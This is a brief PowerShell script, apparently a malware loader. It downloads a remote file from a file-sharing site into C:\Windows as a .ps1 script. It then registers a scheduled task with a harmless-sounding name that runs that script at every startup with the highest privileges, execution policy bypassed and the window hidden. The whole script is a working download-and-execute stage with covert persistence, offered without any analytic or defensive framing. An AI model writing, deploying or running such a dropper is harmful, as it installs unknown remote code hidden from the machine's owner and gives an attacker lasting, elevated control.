# URL of the file to download
$url = "https://krakenfiles.com/view/6kVnqolWyw/file.html"

# Directory where the file will be downloaded
$downloadDirectory = "C:\Windows"

# Download the file using curl (Invoke-WebRequest)
$downloadPath = Join-Path -Path $downloadDirectory -ChildPath "orkidekobling.ps1"
Invoke-WebRequest -Uri $url -OutFile $downloadPath

# Register a scheduled task to run the downloaded PowerShell script at startup as a background process
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Start-Process 'PowerShell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `'$downloadPath`' -WindowStyle Hidden -Verb RunAs -PassThru`" -NoNewWindow"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd

Register-ScheduledTask -TaskName "Iktorkideservice" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force